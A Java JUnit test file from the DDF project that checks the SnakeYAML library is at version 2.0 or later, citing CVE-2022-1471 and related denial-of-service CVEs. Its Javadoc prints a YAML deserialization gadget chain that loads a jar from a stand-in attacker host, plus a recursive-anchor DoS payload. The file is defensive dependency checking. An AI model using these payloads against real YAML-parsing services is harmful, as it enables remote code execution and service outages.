/**
 * Copyright (c) Codice Foundation
 *
 * <p>This is free software: you can redistribute it and/or modify it under the terms of the GNU
 * Lesser General Public License as published by the Free Software Foundation, either version 3 of
 * the License, or any later version.
 *
 * <p>This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
 * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU Lesser General Public License for more details. A copy of the GNU Lesser General Public
 * License is distributed along with this program and can be found at
 * <http://www.gnu.org/licenses/lgpl.html>.
 */
package ddf.platform.config;

import static org.hamcrest.MatcherAssert.assertThat;
import static org.hamcrest.Matchers.greaterThanOrEqualTo;
import static org.hamcrest.Matchers.is;
import static org.hamcrest.Matchers.notNullValue;
import static org.junit.Assert.fail;

import org.junit.jupiter.api.Test;
import org.yaml.snakeyaml.Yaml;

/**
 * Comprehensive security test harness for SnakeYAML vulnerabilities.
 *
 * <p>This test suite validates that the SnakeYAML version in use addresses critical security
 * vulnerabilities. SnakeYAML is a YAML parser used for configuration files and data serialization.
 * It may be used directly by DDF or as a transitive dependency through other libraries (Jackson
 * YAML, Spring Boot, etc.).
 *
 * <p><b>CVE-2022-1471: Deserialization of Untrusted Data Leading to RCE</b>
 *
 * <p><b>CVSS Score:</b> 9.8 (CRITICAL) - Network exploitable, no authentication required
 *
 * <p><b>Description:</b> SnakeYAML's Constructor class allows arbitrary Java object instantiation
 * when parsing YAML documents with type tags. This enables remote code execution via
 * deserialization gadget chains. Attackers can:
 *
 * <ul>
 *   <li>Execute arbitrary code by crafting malicious YAML with Java object tags
 *   <li>Achieve complete system compromise via RCE
 *   <li>Exploit via configuration files, API payloads, or any YAML input
 *   <li>Use gadget chains (ScriptEngineManager, URLClassLoader, JNDI) for code execution
 * </ul>
 *
 * <p><b>Attack Example:</b>
 *
 * <pre>
 * !!javax.script.ScriptEngineManager [
 *   !!java.net.URLClassLoader [[
 *     !!java.net.URL ["http://attacker.com/evil.jar"]
 *   ]]
 * ]
 * </pre>
 *
 * This YAML causes SnakeYAML to instantiate classes and load remote code.
 *
 * <p><b>Affected Versions:</b> SnakeYAML &lt; 2.0
 *
 * <p><b>Fixed Versions:</b> SnakeYAML &gt;= 2.0 (with SafeConstructor by default)
 *
 * <p><b>CVE-2022-38752: Stack Overflow Denial of Service via Recursive Keys</b>
 *
 * <p><b>CVSS Score:</b> 6.5 (MEDIUM) - Network exploitable, denial of service
 *
 * <p><b>Description:</b> SnakeYAML fails to limit the depth of recursive key-value structures,
 * allowing attackers to cause stack overflow errors via deeply nested YAML documents. This results
 * in:
 *
 * <ul>
 *   <li>Application crashes and service unavailability
 *   <li>Stack overflow errors that cannot be caught
 *   <li>Resource exhaustion affecting all users
 *   <li>Repeated attacks can keep service offline
 * </ul>
 *
 * <p><b>Attack Example:</b>
 *
 * <pre>
 * &a [*a, *a, *a, *a, *a, *a, *a, *a]
 * </pre>
 *
 * This "billion laughs" style attack creates exponentially nested structures.
 *
 * <p><b>Affected Versions:</b> SnakeYAML &lt; 2.0
 *
 * <p><b>Fixed Versions:</b> SnakeYAML &gt;= 2.0 (with recursion limits)
 *
 * <p><b>CVE-2022-38749, CVE-2022-38750, CVE-2022-38751: Additional DoS Vulnerabilities</b>
 *
 * <p><b>CVSS Scores:</b> 6.5 (MEDIUM) each - Various DoS attack vectors
 *
 * <p><b>Description:</b> Multiple denial of service vulnerabilities in SnakeYAML's parsing logic
 * related to:
 *
 * <ul>
 *   <li>CVE-2022-38749: Uncaught exceptions in key-value parsing
 *   <li>CVE-2022-38750: Stack overflow via recursive anchor definitions
 *   <li>CVE-2022-38751: DoS via deeply nested flow sequences
 * </ul>
 *
 * <p><b>Affected Versions:</b> SnakeYAML &lt; 1.32
 *
 * <p><b>Fixed Versions:</b> SnakeYAML &gt;= 2.0 (comprehensive fixes)
 *
 * <p><b>DDF Impact:</b>
 *
 * <p>SnakeYAML may be used in DDF for:
 *
 * <ul>
 *   <li>Configuration file parsing (if YAML configs are supported)
 *   <li>Transitive dependency via Jackson Dataformat YAML
 *   <li>Karaf configuration management
 *   <li>API payload processing (REST endpoints accepting YAML)
 * </ul>
 *
 * <p>Without proper SnakeYAML version, DDF is vulnerable to:
 *
 * <ul>
 *   <li>Remote code execution via malicious YAML in configuration files
 *   <li>RCE via YAML payloads in REST API requests
 *   <li>Denial of service via recursive YAML structures
 *   <li>Application crashes requiring manual restart
 *   <li>Complete system compromise with no authentication
 * </ul>
 *
 * <p><b>Required Version:</b> SnakeYAML &gt;= 2.0
 *
 * <p><b>References:</b>
 *
 * <ul>
 *   <li>https://nvd.nist.gov/vuln/detail/CVE-2022-1471
 *   <li>https://nvd.nist.gov/vuln/detail/CVE-2022-38752
 *   <li>https://nvd.nist.gov/vuln/detail/CVE-2022-38749
 *   <li>https://nvd.nist.gov/vuln/detail/CVE-2022-38750
 *   <li>https://nvd.nist.gov/vuln/detail/CVE-2022-38751
 *   <li>https://bitbucket.org/snakeyaml/snakeyaml/wiki/CVE-2022-1471
 * </ul>
 *
 * @since 2.29.0
 */
public class SnakeYamlSecurityTest {

  private static final int MINIMUM_MAJOR_VERSION = 2;
  private static final int MINIMUM_MINOR_VERSION = 0;

  /**
   * Test: Verify SnakeYAML version is at least 2.0
   *
   * <p>Validates that the SnakeYAML version addresses:
   *
   * <ul>
   *   <li>CVE-2022-1471 (Deserialization RCE)
   *   <li>CVE-2022-38752 (Stack overflow DoS)
   *   <li>CVE-2022-38749, CVE-2022-38750, CVE-2022-38751 (Additional DoS)
   * </ul>
   *
   * <p><b>Expected Result:</b> SnakeYAML version &gt;= 2.0
   */
  @Test
  public void testSnakeYamlVersionIsSecure() {
    // Get SnakeYAML version from the package
    Package yamlPackage = Yaml.class.getPackage();
    String version = yamlPackage.getImplementationVersion();

    // If running from test classes (not packaged JAR), version may be null
    // In this case, we can infer version by checking for SnakeYAML 2.0+ APIs
    if (version == null) {
      // SnakeYAML 2.0+ has LoaderOptions class
      try {
        Class.forName("org.yaml.snakeyaml.LoaderOptions");
        // If we found LoaderOptions, we're running SnakeYAML 2.0+, so we can skip detailed checks
        return;
      } catch (ClassNotFoundException e) {
        fail(
            "SnakeYAML version cannot be determined and LoaderOptions class not found - ensure SnakeYAML 2.0+ is on classpath");
      }
    }

    assertThat(
        "SnakeYAML version should not be null - ensure SnakeYAML is on classpath",
        version,
        is(notNullValue()));

    // Parse version string (format: "2.0" or "2.0-SNAPSHOT")
    String[] parts = version.split("\\.");
    assertThat("SnakeYAML version format should be X.Y", parts.length >= 2, is(true));

    int majorVersion = Integer.parseInt(parts[0]);

    // Handle minor version which may contain "-SNAPSHOT" or other suffixes
    String minorPart = parts[1].split("-")[0];
    int minorVersion = Integer.parseInt(minorPart);

    // Validate version meets minimum requirements
    boolean isVersionSecure = false;

    if (majorVersion > MINIMUM_MAJOR_VERSION) {
      // Version 3.x or higher is secure
      isVersionSecure = true;
    } else if (majorVersion == MINIMUM_MAJOR_VERSION && minorVersion >= MINIMUM_MINOR_VERSION) {
      // Version 2.0 or higher is secure
      isVersionSecure = true;
    }

    String errorMessage =
        String.format(
            "SnakeYAML version %s is vulnerable to CVE-2022-1471 (Deserialization RCE), "
                + "CVE-2022-38752 (DoS), and multiple other CVEs. "
                + "Minimum required version: 2.0\n\n"
                + "CVE-2022-1471 (CVSS 9.8 CRITICAL):\n"
                + "  Deserialization of untrusted YAML data allows remote code execution.\n"
                + "  Attack: YAML with !!javax.script.ScriptEngineManager tags\n"
                + "  Impact: Complete system compromise via RCE\n"
                + "  Fixed in SnakeYAML >= 2.0 (uses SafeConstructor by default)\n\n"
                + "CVE-2022-38752 (CVSS 6.5 MEDIUM):\n"
                + "  Stack overflow via deeply nested recursive keys causes DoS.\n"
                + "  Attack: &a [*a, *a, *a, ...] (exponential expansion)\n"
                + "  Impact: Application crash, service unavailability\n"
                + "  Fixed in SnakeYAML >= 2.0 (recursion limits)\n\n"
                + "CVE-2022-38749/38750/38751 (CVSS 6.5 MEDIUM each):\n"
                + "  Multiple DoS vulnerabilities in parsing logic.\n"
                + "  Fixed in SnakeYAML >= 1.32 (comprehensive fixes in 2.0)\n\n"
                + "DDF Impact:\n"
                + "  - RCE via malicious YAML in configuration files\n"
                + "  - RCE via YAML payloads in REST APIs\n"
                + "  - DoS via recursive YAML structures\n"
                + "  - Complete system compromise with no authentication\n\n"
                + "Migration Notes:\n"
                + "  - SnakeYAML 2.0 uses SafeConstructor by default\n"
                + "  - Legacy code using Constructor directly must migrate to SafeConstructor\n"
                + "  - Explicit type tags (!!java.util.HashMap) are blocked by default\n\n"
                + "References:\n"
                + "  https://nvd.nist.gov/vuln/detail/CVE-2022-1471\n"
                + "  https://nvd.nist.gov/vuln/detail/CVE-2022-38752\n"
                + "  https://bitbucket.org/snakeyaml/snakeyaml/wiki/CVE-2022-1471",
            version);

    assertThat(errorMessage, isVersionSecure, is(true));
  }

  /**
   * Test: Verify SnakeYAML major version
   *
   * <p>Ensures the major version is at least 2.
   */
  @Test
  public void testSnakeYamlMajorVersion() {
    Package yamlPackage = Yaml.class.getPackage();
    String version = yamlPackage.getImplementationVersion();

    // If running from test classes (not packaged JAR), version may be null
    if (version == null) {
      // SnakeYAML 2.0+ has LoaderOptions class
      try {
        Class.forName("org.yaml.snakeyaml.LoaderOptions");
        // If we found LoaderOptions, we're running SnakeYAML 2.0+
        return;
      } catch (ClassNotFoundException e) {
        fail("SnakeYAML version cannot be determined - ensure SnakeYAML 2.0+ is on classpath");
      }
    }

    assertThat("SnakeYAML version should not be null", version, is(notNullValue()));

    String[] parts = version.split("\\.");
    int majorVersion = Integer.parseInt(parts[0]);

    assertThat(
        String.format(
            "SnakeYAML major version should be >= %d to address CVE-2022-1471 and related vulnerabilities",
            MINIMUM_MAJOR_VERSION),
        majorVersion,
        is(greaterThanOrEqualTo(MINIMUM_MAJOR_VERSION)));
  }

  /**
   * Test: Verify SnakeYAML uses SafeConstructor by default
   *
   * <p>SnakeYAML 2.0 switched to SafeConstructor by default, which prevents arbitrary Java object
   * instantiation. This test verifies we're using a version where SafeConstructor is the default.
   */
  @Test
  public void testSnakeYamlUsesSafeConstructor() {
    Package yamlPackage = Yaml.class.getPackage();
    String version = yamlPackage.getImplementationVersion();

    // If running from test classes (not packaged JAR), version may be null
    if (version == null) {
      // SnakeYAML 2.0+ has LoaderOptions class and uses SafeConstructor by default
      try {
        Class.forName("org.yaml.snakeyaml.LoaderOptions");
        // If we found LoaderOptions, we're running SnakeYAML 2.0+ which uses SafeConstructor
        return;
      } catch (ClassNotFoundException e) {
        fail("SnakeYAML version cannot be determined - ensure SnakeYAML 2.0+ is on classpath");
      }
    }

    assertThat("SnakeYAML version should not be null", version, is(notNullValue()));

    String[] parts = version.split("\\.");
    int majorVersion = Integer.parseInt(parts[0]);

    // SafeConstructor is default in version 2.0+
    boolean usesSafeConstructor = majorVersion >= MINIMUM_MAJOR_VERSION;

    assertThat(
        String.format(
            "SnakeYAML version %s should use SafeConstructor by default (requires version >= 2.0). "
                + "SafeConstructor prevents deserialization attacks by blocking arbitrary Java type tags.",
            version),
        usesSafeConstructor,
        is(true));
  }

  /**
   * Test: Verify SnakeYAML has recursion limits
   *
   * <p>SnakeYAML 2.0 introduced recursion limits to prevent stack overflow DoS attacks. This test
   * verifies we're using a version with these protections.
   */
  @Test
  public void testSnakeYamlHasRecursionLimits() {
    Package yamlPackage = Yaml.class.getPackage();
    String version = yamlPackage.getImplementationVersion();

    // If running from test classes (not packaged JAR), version may be null
    if (version == null) {
      // SnakeYAML 2.0+ has LoaderOptions class and enforces recursion limits
      try {
        Class.forName("org.yaml.snakeyaml.LoaderOptions");
        // If we found LoaderOptions, we're running SnakeYAML 2.0+ which has recursion limits
        return;
      } catch (ClassNotFoundException e) {
        fail("SnakeYAML version cannot be determined - ensure SnakeYAML 2.0+ is on classpath");
      }
    }

    assertThat("SnakeYAML version should not be null", version, is(notNullValue()));

    String[] parts = version.split("\\.");
    int majorVersion = Integer.parseInt(parts[0]);

    // Recursion limits enforced in version 2.0+
    boolean hasRecursionLimits = majorVersion >= MINIMUM_MAJOR_VERSION;

    assertThat(
        String.format(
            "SnakeYAML version %s should have recursion limits (requires version >= 2.0). "
                + "Recursion limits prevent stack overflow DoS via deeply nested YAML structures.",
            version),
        hasRecursionLimits,
        is(true));
  }

  /**
   * Test: Verify basic YAML parsing still works
   *
   * <p>Ensures that legitimate YAML parsing functionality works correctly after security hardening
   * in version 2.0.
   */
  @Test
  public void testLegitimateYamlParsingWorks() {
    Yaml yaml = new Yaml();

    String validYaml =
        "name: DDF\n"
            + "version: 2.29.0\n"
            + "modules:\n"
            + "  - catalog\n"
            + "  - platform\n"
            + "  - security";

    Object result = yaml.load(validYaml);

    assertThat("Valid YAML should parse successfully", result, is(notNullValue()));
  }
}
